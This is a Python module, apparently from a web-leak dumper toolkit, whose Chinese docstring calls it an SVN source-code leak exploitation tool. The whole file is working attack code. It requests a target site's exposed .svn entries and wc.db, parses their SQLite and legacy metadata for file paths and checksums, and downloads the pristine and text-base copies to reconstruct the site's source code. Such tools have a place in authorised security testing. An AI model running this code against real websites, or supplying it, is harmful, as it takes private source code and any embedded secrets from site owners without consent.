#!/usr/bin/env python3
# -*- coding=utf-8 -*-

"""
SVN源代码泄露利用工具
"""

import re
import os
import sqlite3
from urllib.parse import quote
from xml.etree import ElementTree
import click
from aiomultiprocess import Pool
from ..dumper import BaseDumper


class Dumper(BaseDumper):
    """ .svn Dumper """

    def __init__(self, url: str, outdir: str, **kwargs):
        super(Dumper, self).__init__(url, outdir, **kwargs)
        self.base_url = re.sub(r"\.svn.*", ".svn", url)
        self.root_url = re.sub(r"/?\.svn.*", "", url).rstrip("/")

    async def start(self):
        """ dumper入口方法 """
        entries_url = self.base_url + "/entries"
        status, data = await self.fetch(entries_url)
        if status != 200 or not data:
            click.secho("Failed [%s] %s" % (status, entries_url), fg="red")
            return
        if not self.is_valid_entries(data):
            click.secho("SVN: invalid entries, skip .svn.", fg="yellow")
            return
        if data == b"12\n":
            await self.dump()
        else:
            click.secho("SVN: legacy entries detected.", fg="cyan")
            await self.dump_legacy(data)

    async def dump(self):
        """ 针对svn1.7以后的版本 """
        self.targets.append((self.base_url + "/entries", ".svn/entries"))
        self.targets.append((self.base_url + "/wc.db", ".svn/wc.db"))
        pristine_paths = set()
        # 创建一个临时文件用来存储wc.db
        idxfile = await self.indexfile(self.base_url + "/wc.db")
        if not idxfile:
            return
        try:
            # 从wc.db中解析URL和文件名
            for item in self.parse_wcdb(idxfile.name):
                sha1, filename = item
                if not sha1 or not filename:
                    continue
                sha1 = self.normalize_checksum(sha1)
                if not sha1:
                    continue
                url = "%s/pristine/%s/%s.svn-base" % (self.base_url, sha1[:2], sha1)
                pristine_path = ".svn/pristine/%s/%s.svn-base" % (sha1[:2], sha1)
                if not self.force and not await self.checkit(url, filename):
                    exit()
                self.targets.append((url, filename))
                pristine_paths.add((url, pristine_path))

            for checksum in self.parse_pristine_checksums(idxfile.name):
                sha1 = self.normalize_checksum(checksum)
                if not sha1:
                    continue
                url = "%s/pristine/%s/%s.svn-base" % (self.base_url, sha1[:2], sha1)
                pristine_path = ".svn/pristine/%s/%s.svn-base" % (sha1[:2], sha1)
                pristine_paths.add((url, pristine_path))

            for url, pristine_path in sorted(pristine_paths):
                if not self.force and not await self.checkit(url, pristine_path):
                    exit()
                self.targets.append((url, pristine_path))
        finally:
            idxfile.close()
            os.unlink(idxfile.name)
        # 创建进程池，调用download
        async with Pool() as pool:
            await pool.map(self.download, self.targets)

    async def dump_legacy(self, root_entries: bytes):
        """ 针对svn1.7以前的版本 """
        await self.collect_legacy_targets("", root_entries)
        if not self.targets:
            click.secho("No legacy SVN files found.", fg="yellow")
            return
        async with Pool() as pool:
            await pool.map(self.download, self.targets)

    async def collect_legacy_targets(self, rel_dir: str, entries: bytes):
        """ Recursively collect targets from pre-1.7 .svn/entries files. """
        entries_target = "/".join(part for part in (rel_dir, ".svn/entries") if part)
        entries_url = (
            "%s/%s/.svn/entries" % (self.root_url, quote(rel_dir))
            if rel_dir
            else self.base_url + "/entries"
        )
        self.targets.append((entries_url, entries_target))

        for kind, name in self.parse_legacy_entries(entries):
            rel_path = "/".join(part for part in (rel_dir, name) if part)
            quoted_rel_path = quote(rel_path)
            if kind == "file":
                if rel_dir:
                    url = "%s/%s/.svn/text-base/%s.svn-base" % (
                        self.root_url,
                        quote(rel_dir),
                        quote(name),
                    )
                    svn_base_path = "%s/.svn/text-base/%s.svn-base" % (rel_dir, name)
                else:
                    url = "%s/text-base/%s.svn-base" % (self.base_url, quote(name))
                    svn_base_path = ".svn/text-base/%s.svn-base" % name
                if not self.force and not await self.checkit(url, rel_path):
                    exit()
                self.targets.append((url, rel_path))
                if not self.force and not await self.checkit(url, svn_base_path):
                    exit()
                self.targets.append((url, svn_base_path))
            elif kind == "dir":
                entries_url = "%s/%s/.svn/entries" % (self.root_url, quoted_rel_path)
                status, data = await self.fetch(entries_url)
                if status == 200 and data:
                    await self.collect_legacy_targets(rel_path, data)

    def parse_wcdb(self, filename: str) -> list:
        """ sqlite解析wc.db并返回一个(hash, name)组成列表 """
        try:
            conn = sqlite3.connect(filename)
            cursor = conn.cursor()
            cursor.execute("select checksum, local_relpath from NODES")
            items = cursor.fetchall()
            conn.close()
            return items
        except Exception as e:
            click.secho("Sqlite connection failed.", fg="red")
            click.secho(str(e.args), fg="red")
            return []

    def is_valid_entries(self, data: bytes) -> bool:
        text = data.decode("utf-8", errors="ignore").lstrip().lower()
        if text.startswith("<!doctype") or text.startswith("<html"):
            return False
        return True

    def parse_pristine_checksums(self, filename: str) -> list:
        """ sqlite解析PRISTINE表并返回全部对象hash """
        try:
            conn = sqlite3.connect(filename)
            cursor = conn.cursor()
            cursor.execute("select checksum from PRISTINE")
            items = [item[0] for item in cursor.fetchall()]
            conn.close()
            return items
        except Exception as e:
            click.secho("Sqlite PRISTINE connection failed.", fg="red")
            click.secho(str(e.args), fg="red")
            return []

    def normalize_checksum(self, checksum: str) -> str:
        """ Return the raw sha1 hex digest from SVN checksum formats. """
        if not checksum:
            return ""
        return checksum.split("$")[-1].strip()

    def parse_legacy_entries(self, data: bytes) -> list:
        """ Parse SVN <=1.6 entries metadata into (kind, name) pairs. """
        text = data.decode("utf-8", errors="ignore")
        if text.lstrip().startswith("<?xml"):
            return self.parse_xml_entries(text)
        return self.parse_plain_entries(text)

    def parse_xml_entries(self, text: str) -> list:
        try:
            root = ElementTree.fromstring(text)
        except ElementTree.ParseError as e:
            click.secho("Failed to parse legacy SVN XML entries.", fg="red")
            click.secho(str(e.args), fg="red")
            return []
        items = []
        for entry in root.findall(".//entry"):
            name = entry.get("name", "").strip()
            kind = entry.get("kind", "").strip()
            if name and kind in ("file", "dir"):
                items.append((kind, name))
        return items

    def parse_plain_entries(self, text: str) -> list:
        first_line, sep, rest = text.partition("\n")
        if sep and first_line.strip().isdigit():
            text = rest

        items = []
        for block in text.split("\f"):
            block_lines = block.strip("\n").splitlines()
            if len(block_lines) < 2:
                continue
            name = block_lines[0].strip()
            kind = block_lines[1].strip()
            if name and kind in ("file", "dir"):
                items.append((kind, name))
        return items
